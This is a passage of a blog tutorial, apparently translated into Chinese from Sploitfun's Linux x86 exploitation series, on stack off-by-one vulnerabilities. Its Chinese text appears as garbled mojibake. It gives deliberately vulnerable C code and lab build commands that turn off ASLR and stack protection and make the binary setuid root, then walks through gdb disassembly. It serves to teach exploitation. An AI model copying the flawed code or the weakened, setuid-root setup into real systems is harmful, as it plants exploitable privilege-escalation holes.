<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>æ ˆå†…off-by-oneæ¼æ´åˆ©ç”¨ | Index of Computer System and Security</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
    <meta name="keywords" content="computer system, computer security" />
  
  
  
  
  <meta name="description" content="ä½œè€…: CSysSecå‡ºå“

CSysSecæ³¨ï¼š æœ¬ç³»åˆ—æ–‡ç« è¯‘è‡ªå®‰å…¨è‡ªç”±å·¥ä½œè€…Sploitfunçš„æ¼æ´åˆ©ç”¨ç³»åˆ—åšå®¢ï¼Œä»ç»å…¸æ ˆç¼“å†²åŒºæ¼æ´åˆ©ç”¨å †æ¼æ´åˆ©ç”¨ï¼Œå¾ªåºæ¸è¿›ï¼Œæ˜¯åˆå­¦è€…ä¸å¯å¤šå¾—çš„å¥½ææ–™ï¼ŒCSysSecè®¡åˆ’åœ¨åŸåŸºç¡€ä¸Šä¸æ–­æ·»åŠ ç›¸å…³æ¼æ´åˆ©ç”¨æŠ€æœ¯ä»¥åŠç›¸åº”çš„Mitigationæ–¹æ³•ï¼Œæ¬¢è¿æ¨èæˆ–è‡ªèæ–‡ç« ã€‚è½¬è½½æœ¬æ–‡è¯·åŠ¡å¿…æ³¨æ˜ï¼Œæ–‡ç« å‡ºå¤„ï¼šã€ŠLinux(X86)æ¼æ´åˆ©ç”¨ç³»åˆ—-æ ˆå†…Off-by-oneæ¼æ´åˆ©ç”¨ã€‹ä¸ä½œè€…">
<meta property="og:type" content="article">
<meta property="og:title" content="æ ˆå†…off-by-oneæ¼æ´åˆ©ç”¨">
<meta property="og:url" content="http://yoursite.com/20161231/stackoffbyone/index.html">
<meta property="og:site_name" content="Index of Computer System and Security">
<meta property="og:description" content="ä½œè€…: CSysSecå‡ºå“

CSysSecæ³¨ï¼š æœ¬ç³»åˆ—æ–‡ç« è¯‘è‡ªå®‰å…¨è‡ªç”±å·¥ä½œè€…Sploitfunçš„æ¼æ´åˆ©ç”¨ç³»åˆ—åšå®¢ï¼Œä»ç»å…¸æ ˆç¼“å†²åŒºæ¼æ´åˆ©ç”¨å †æ¼æ´åˆ©ç”¨ï¼Œå¾ªåºæ¸è¿›ï¼Œæ˜¯åˆå­¦è€…ä¸å¯å¤šå¾—çš„å¥½ææ–™ï¼ŒCSysSecè®¡åˆ’åœ¨åŸåŸºç¡€ä¸Šä¸æ–­æ·»åŠ ç›¸å…³æ¼æ´åˆ©ç”¨æŠ€æœ¯ä»¥åŠç›¸åº”çš„Mitigationæ–¹æ³•ï¼Œæ¬¢è¿æ¨èæˆ–è‡ªèæ–‡ç« ã€‚è½¬è½½æœ¬æ–‡è¯·åŠ¡å¿…æ³¨æ˜ï¼Œæ–‡ç« å‡ºå¤„ï¼šã€ŠLinux(X86)æ¼æ´åˆ©ç”¨ç³»åˆ—-æ ˆå†…Off-by-oneæ¼æ´åˆ©ç”¨ã€‹ä¸ä½œè€…">
<meta property="og:image" content="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png">
<meta property="og:updated_time" content="2016-12-31T06:43:29.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="æ ˆå†…off-by-oneæ¼æ´åˆ©ç”¨">
<meta name="twitter:description" content="ä½œè€…: CSysSecå‡ºå“

CSysSecæ³¨ï¼š æœ¬ç³»åˆ—æ–‡ç« è¯‘è‡ªå®‰å…¨è‡ªç”±å·¥ä½œè€…Sploitfunçš„æ¼æ´åˆ©ç”¨ç³»åˆ—åšå®¢ï¼Œä»ç»å…¸æ ˆç¼“å†²åŒºæ¼æ´åˆ©ç”¨å †æ¼æ´åˆ©ç”¨ï¼Œå¾ªåºæ¸è¿›ï¼Œæ˜¯åˆå­¦è€…ä¸å¯å¤šå¾—çš„å¥½ææ–™ï¼ŒCSysSecè®¡åˆ’åœ¨åŸåŸºç¡€ä¸Šä¸æ–­æ·»åŠ ç›¸å…³æ¼æ´åˆ©ç”¨æŠ€æœ¯ä»¥åŠç›¸åº”çš„Mitigationæ–¹æ³•ï¼Œæ¬¢è¿æ¨èæˆ–è‡ªèæ–‡ç« ã€‚è½¬è½½æœ¬æ–‡è¯·åŠ¡å¿…æ³¨æ˜ï¼Œæ–‡ç« å‡ºå¤„ï¼šã€ŠLinux(X86)æ¼æ´åˆ©ç”¨ç³»åˆ—-æ ˆå†…Off-by-oneæ¼æ´åˆ©ç”¨ã€‹ä¸ä½œè€…">
<meta name="twitter:image" content="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png">
  
    <link rel="alternate" href="/atom.xml" title="Index of Computer System and Security" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >
  <link rel="stylesheet" href="/css/hiero.css" >
  <link rel="stylesheet" href="/css/glyphs.css" >

</head>

<body>
  <header id="allheader" class="site-header" role="banner">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            <a href="/" title="Index of Computer System and Security" rel="home">
              Index of Computer System and Security</a>
          </h1>
          <div class="site-description">FROM 0 TO 1</div>

            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>
            <div class="clearfix sf-menu">

              <ul id="main-nav" class="nmenu sf-js-enabled">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">é¦–é¡µ</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/syssec">ç³»ç»Ÿå®‰å…¨</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/architecture">ä½“ç³»ç»“æ„</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/virtualization">è™šæ‹ŸåŒ–</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/conferences">ä¸»æµä¼šè®®</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/academy">å­¦æœ¯ä¸“å®¶</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/celebrity">å·¥ä¸šå¤§å’–</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/contribution">æœ¬ç«™è¾¾äºº</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">å…³äº</a> </li>
                    
              </ul>
            </div>
          </nav>


      </div>
  </div>
</header>




  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-stackoffbyone" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      æ ˆå†…off-by-oneæ¼æ´åˆ©ç”¨
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20161231/stackoffbyone/" class="article-date">
	  <time datetime="2016-12-31T06:38:26.000Z" itemprop="datePublished">åäºŒæœˆ 31, 2016</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>ä½œè€…: <a href="http://csyssec.org" target="_blank" rel="external">CSysSecå‡ºå“</a></p>
<hr>
<p><strong>CSysSecæ³¨</strong>ï¼š æœ¬ç³»åˆ—æ–‡ç« è¯‘è‡ªå®‰å…¨è‡ªç”±å·¥ä½œè€…<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>çš„æ¼æ´åˆ©ç”¨ç³»åˆ—åšå®¢ï¼Œä»ç»å…¸æ ˆç¼“å†²åŒºæ¼æ´åˆ©ç”¨å †æ¼æ´åˆ©ç”¨ï¼Œå¾ªåºæ¸è¿›ï¼Œæ˜¯åˆå­¦è€…ä¸å¯å¤šå¾—çš„å¥½ææ–™ï¼ŒCSysSecè®¡åˆ’åœ¨åŸåŸºç¡€ä¸Šä¸æ–­æ·»åŠ ç›¸å…³æ¼æ´åˆ©ç”¨æŠ€æœ¯ä»¥åŠç›¸åº”çš„Mitigationæ–¹æ³•ï¼Œæ¬¢è¿æ¨èæˆ–è‡ªèæ–‡ç« ã€‚<br><strong>è½¬è½½æœ¬æ–‡è¯·åŠ¡å¿…æ³¨æ˜</strong>ï¼Œæ–‡ç« å‡ºå¤„ï¼šã€Š<a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">Linux(X86)æ¼æ´åˆ©ç”¨ç³»åˆ—-æ ˆå†…Off-by-oneæ¼æ´åˆ©ç”¨</a>ã€‹ä¸ä½œè€…ä¿¡æ¯ï¼š<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSecå‡ºå“</a></p>
<hr>
<blockquote>
<ul>
<li>0X01 ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´</li>
<li>0X02 å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ</li>
<li>0X03 å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºæ­£ä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ</li>
<li>0X04 ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºæ­£ä¸Šæ–¹</li>
</ul>
</blockquote>
<p><u><em>é˜…è¯»åŸºç¡€:</em></u></p>
<ol>
<li><a href="http://www.csyssec.org/20161231/stackbufferflow/" target="_blank" rel="external">ç»å…¸æ ˆç¼“å†²åŒºæº¢å‡º</a></li>
</ol>
<p><u><em>VM Setup:</em></u> Ubuntu 12.04 (x86)</p>
<h3 id="0X01-ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´ï¼Ÿ"><a href="#0X01-ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´ï¼Ÿ" class="headerlink" title="0X01 ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´ï¼Ÿ"></a>0X01 ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´ï¼Ÿ</h3><p>å°†æºç¼“å†²åŒºå¤åˆ¶åˆ°ç›®æ ‡ç¼“å†²åŒºæ—¶ï¼Œä»¥ä¸‹æƒ…å†µå¯èƒ½å¯¼è‡´Off-By-Oneæ¼æ´ï¼š</p>
<pre><code>æºå­—ç¬¦ä¸²é•¿åº¦ç­‰äºç›®æ ‡ç¼“å†²åŒºé•¿åº¦
</code></pre><p>å½“æºå­—ç¬¦ä¸²é•¿åº¦ç­‰äºç›®æ ‡ç¼“å†²åŒºé•¿åº¦æ—¶ï¼Œå•ä¸ªNULLå­—èŠ‚å°±ä¼šè¢«å¤åˆ¶åˆ°ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œç”±äºç›®æ ‡ç¼“å†²åŒºå­˜å‚¨åœ¨æ ˆå†…ï¼Œå› æ­¤ï¼Œä»…å‡­å•ä¸ªNULLå­—èŠ‚å°±èƒ½æŠŠæ ˆå†…è°ƒç”¨è€…EBPçš„æœ€ä½æœ‰æ•ˆä½(LSB)è¦†ç›–æ‰ã€‚</p>
<p>ä¾ç…§æƒ¯ä¾‹ï¼Œæœªå…å®šä¹‰è¿‡äºæ¯ç‡¥ï¼Œä¸‹é¢æˆ‘ä»¬å°±æ¥çœ‹ä¸€åˆ™Off-By-Oneæ¼æ´ä»£ç ã€‚</p>
<p><u><em>æ¼æ´ä»£ç ï¼š</em></u></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> bar(arg); <span class="comment">/* [1] */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [2] */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">256</span>) &#123; <span class="comment">/* [3] */</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Attempted Buffer Overflow\n"</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line"> &#125;</div><div class="line"> foo(argv[<span class="number">1</span>]); <span class="comment">/* [4] */</span></div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><u><em>ç¼–è¯‘å‘½ä»¤ï¼š</em></u></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -z execstack -mpreferred-<span class="built_in">stack</span>-boundary=<span class="number">2</span> -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<p>ä¸Šè¿°æ¼æ´ä»£ç çš„ç¬¬[2]è¡Œå°±æ˜¯Off-By-Oneæº¢å‡ºé—®é¢˜å¯èƒ½å‡ºç°çš„åœ°æ–¹ã€‚ç”±äºç›®æ ‡ç¼“å†²åŒºé•¿åº¦ä¸º256ï¼Œå› æ­¤256å­—èŠ‚çš„æºå­—ç¬¦ä¸²å°±å¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p><strong>æ³¨ï¼šæœ¬ç³»åˆ—æ‰€æœ‰æ–‡ç« ä¸­ç¬¬[N]è¡Œä»£ç æŒ‡çš„çš„ä»£ç ä¸­æ˜¾ç¤º/*[N]*/çš„ä½ç½®ã€‚</strong></p>
<h3 id="0X02-å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ"><a href="#0X02-å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ" class="headerlink" title="0X02 å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ"></a>0X02 å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ</h3><p>ä»»æ„ä»£ç æ‰§è¡Œæ˜¯é€šè¿‡â€œEBP è¦†ç›–ï¼ˆEBP overwriteï¼‰â€æ–¹æ³•å®ç°çš„ã€‚å¦‚æœè°ƒç”¨è€…çš„EBPä½äºç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œé‚£ä¹ˆæ‰§è¡Œstrcpyåï¼Œè°ƒç”¨è€…çš„EBPçš„LSBå¾ˆå¯èƒ½å·²ç„¶è¢«å•ä¸ªNULLå­—èŠ‚è¦†ç›–äº†ã€‚ä¸ºäº†è¿›ä¸€æ­¥äº†è§£off-by-oneï¼Œæˆ‘ä»¬æ¥åæ±‡ç¼–ä¸€åˆ™æ¼æ´ä»£ç å¹¶ä¸”ç”»å‡ºå®ƒçš„å †æ ˆå¸ƒå±€å§ã€‚</p>
<p><u><em>åæ±‡ç¼–ï¼š</em></u></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"> (gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="comment">//Function Prologue</span></div><div class="line"> <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's ebp</span></div><div class="line"> <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (main) ebp to esp</span></div><div class="line"> <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;: push %edi                    <span class="comment">//backup EDI</span></div><div class="line"> <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;: sub $<span class="number">0x8</span>,%esp                <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax           <span class="comment">//eax = argv</span></div><div class="line"> <span class="number">0x080484a1</span> &lt;+<span class="number">10</span>&gt;: add $<span class="number">0x4</span>,%eax               <span class="comment">//eax = &amp;argv[1]</span></div><div class="line"> <span class="number">0x080484a4</span> &lt;+<span class="number">13</span>&gt;: mov (%eax),%eax             <span class="comment">//eax = argv[1]</span></div><div class="line"> <span class="number">0x080484a6</span> &lt;+<span class="number">15</span>&gt;: movl $<span class="number">0xffffffff</span>,<span class="number">-0x8</span>(%ebp) <span class="comment">//String Length Calculation -- Begins here</span></div><div class="line"> <span class="number">0x080484ad</span> &lt;+<span class="number">22</span>&gt;: mov %eax,%edx</div><div class="line"> <span class="number">0x080484af</span> &lt;+<span class="number">24</span>&gt;: mov $<span class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x080484b4</span> &lt;+<span class="number">29</span>&gt;: mov <span class="number">-0x8</span>(%ebp),%ecx</div><div class="line"> <span class="number">0x080484b7</span> &lt;+<span class="number">32</span>&gt;: mov %edx,%edi</div><div class="line"> <span class="number">0x080484b9</span> &lt;+<span class="number">34</span>&gt;: repnz scas %es:(%edi),%al</div><div class="line"> <span class="number">0x080484bb</span> &lt;+<span class="number">36</span>&gt;: mov %ecx,%eax</div><div class="line"> <span class="number">0x080484bd</span> &lt;+<span class="number">38</span>&gt;: not %eax</div><div class="line"> <span class="number">0x080484bf</span> &lt;+<span class="number">40</span>&gt;: sub $<span class="number">0x1</span>,%eax               <span class="comment">//String Length Calculation -- Ends here</span></div><div class="line"> <span class="number">0x080484c2</span> &lt;+<span class="number">43</span>&gt;: cmp $<span class="number">0x100</span>,%eax             <span class="comment">//eax = strlen(argv[1]). if eax &gt; 256</span></div><div class="line"> <span class="number">0x080484c7</span> &lt;+<span class="number">48</span>&gt;: jbe <span class="number">0x80484e9</span> &lt;main+<span class="number">82</span>&gt;     <span class="comment">//Jmp if NOT greater</span></div><div class="line"> <span class="number">0x080484c9</span> &lt;+<span class="number">50</span>&gt;: movl $<span class="number">0x80485e0</span>,(%esp)      <span class="comment">//If greater print error string,flush and return.</span></div><div class="line"> <span class="number">0x080484d0</span> &lt;+<span class="number">57</span>&gt;: call <span class="number">0x8048380</span> &lt;<span class="built_in">puts</span>@plt&gt;   </div><div class="line"> <span class="number">0x080484d5</span> &lt;+<span class="number">62</span>&gt;: mov <span class="number">0x804a020</span>,%eax          </div><div class="line"> <span class="number">0x080484da</span> &lt;+<span class="number">67</span>&gt;: mov %eax,(%esp)             </div><div class="line"> <span class="number">0x080484dd</span> &lt;+<span class="number">70</span>&gt;: call <span class="number">0x8048360</span> &lt;fflush@plt&gt;</div><div class="line"> <span class="number">0x080484e2</span> &lt;+<span class="number">75</span>&gt;: mov $<span class="number">0x1</span>,%eax              </div><div class="line"> <span class="number">0x080484e7</span> &lt;+<span class="number">80</span>&gt;: jmp <span class="number">0x80484fe</span> &lt;main+<span class="number">103</span>&gt;</div><div class="line"> <span class="number">0x080484e9</span> &lt;+<span class="number">82</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax          <span class="comment">//argv[1] &lt;= 256, eax = argv</span></div><div class="line"> <span class="number">0x080484ec</span> &lt;+<span class="number">85</span>&gt;: add $<span class="number">0x4</span>,%eax               <span class="comment">//eax = &amp;argv[1]</span></div><div class="line"> <span class="number">0x080484ef</span> &lt;+<span class="number">88</span>&gt;: mov (%eax),%eax             <span class="comment">//eax = argv[1]</span></div><div class="line"> <span class="number">0x080484f1</span> &lt;+<span class="number">90</span>&gt;: mov %eax,(%esp)             <span class="comment">//foo arg</span></div><div class="line"> <span class="number">0x080484f4</span> &lt;+<span class="number">93</span>&gt;: call <span class="number">0x8048464</span>              <span class="comment">//call foo</span></div><div class="line"> <span class="number">0x080484f9</span> &lt;+<span class="number">98</span>&gt;: mov $<span class="number">0x0</span>,%eax               <span class="comment">//return value</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue</span></div><div class="line"> <span class="number">0x080484fe</span> &lt;+<span class="number">103</span>&gt;: add $<span class="number">0x8</span>,%esp              <span class="comment">//unwind stack space</span></div><div class="line"> <span class="number">0x08048501</span> &lt;+<span class="number">106</span>&gt;: pop %edi                   <span class="comment">//restore EDI</span></div><div class="line"> <span class="number">0x08048502</span> &lt;+<span class="number">107</span>&gt;: pop %ebp                   <span class="comment">//restore EBP</span></div><div class="line"> <span class="number">0x08048503</span> &lt;+<span class="number">108</span>&gt;: ret                        <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble foo</div><div class="line">Dump of assembler code <span class="keyword">for</span> function foo:</div><div class="line"> <span class="comment">//Function prologue</span></div><div class="line"> <span class="number">0x08048464</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's (main) ebp</span></div><div class="line"> <span class="number">0x08048465</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (foo) ebp to esp</span></div><div class="line"> <span class="number">0x08048467</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x4</span>,%esp                <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x0804846a</span> &lt;+<span class="number">6</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax           <span class="comment">//foo arg</span></div><div class="line"> <span class="number">0x0804846d</span> &lt;+<span class="number">9</span>&gt;: mov %eax,(%esp)              <span class="comment">//bar arg = foo arg</span></div><div class="line"> <span class="number">0x08048470</span> &lt;+<span class="number">12</span>&gt;: call <span class="number">0x8048477</span>              <span class="comment">//call bar</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue </span></div><div class="line"> <span class="number">0x08048475</span> &lt;+<span class="number">17</span>&gt;: leave                       <span class="comment">//unwind stack space + restore ebp</span></div><div class="line"> <span class="number">0x08048476</span> &lt;+<span class="number">18</span>&gt;: ret                         <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble bar</div><div class="line">Dump of assembler code <span class="keyword">for</span> function bar:</div><div class="line"> <span class="comment">//Function Prologue</span></div><div class="line"> <span class="number">0x08048477</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's (foo) ebp</span></div><div class="line"> <span class="number">0x08048478</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (bar) ebp to esp</span></div><div class="line"> <span class="number">0x0804847a</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x108</span>,%esp              <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x08048480</span> &lt;+<span class="number">9</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax           <span class="comment">//bar arg</span></div><div class="line"> <span class="number">0x08048483</span> &lt;+<span class="number">12</span>&gt;: mov %eax,<span class="number">0x4</span>(%esp)          <span class="comment">//strcpy arg2</span></div><div class="line"> <span class="number">0x08048487</span> &lt;+<span class="number">16</span>&gt;: lea <span class="number">-0x100</span>(%ebp),%eax       <span class="comment">//buf</span></div><div class="line"> <span class="number">0x0804848d</span> &lt;+<span class="number">22</span>&gt;: mov %eax,(%esp)             <span class="comment">//strcpy arg1</span></div><div class="line"> <span class="number">0x08048490</span> &lt;+<span class="number">25</span>&gt;: call <span class="number">0x8048370</span> &lt;<span class="built_in">strcpy</span>@plt&gt; <span class="comment">//call strcpy</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue</span></div><div class="line"> <span class="number">0x08048495</span> &lt;+<span class="number">30</span>&gt;: leave                       <span class="comment">//unwind stack space + restore ebp</span></div><div class="line"> <span class="number">0x08048496</span> &lt;+<span class="number">31</span>&gt;: ret                         <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p><u><em>å †æ ˆå¸ƒå±€ï¼š</em></u></p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

